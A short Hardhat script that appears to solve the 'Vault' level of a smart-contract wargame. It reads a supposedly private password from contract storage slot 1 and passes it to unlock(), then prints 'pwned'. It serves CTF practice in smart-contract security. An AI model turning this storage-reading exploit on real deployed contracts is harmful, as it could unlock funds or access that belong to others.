import { ethers } from "hardhat"
import { LEVEL_ADDRESSES } from "../consts"
import { getSigner } from "../utils"


async function pwn() {
    const signer = await getSigner()
    const contract = await ethers.getContractAt(
        "Vault",
        LEVEL_ADDRESSES.vault,
        signer
    )
    
    const password = await signer?.provider?.getStorageAt(
        contract.address,
        1 //slot 1 of Storage on contract
    )
    
    console.log(`Hang Tight, Pwnge happening...`)
    const call = await contract.unlock(
        password!
    )

    const locked = await contract.locked()
    console.log(locked)

    if(locked) {return "LOCKPICK FAILED"}

    console.log(`pwned :))))`)

 
    
}

pwn()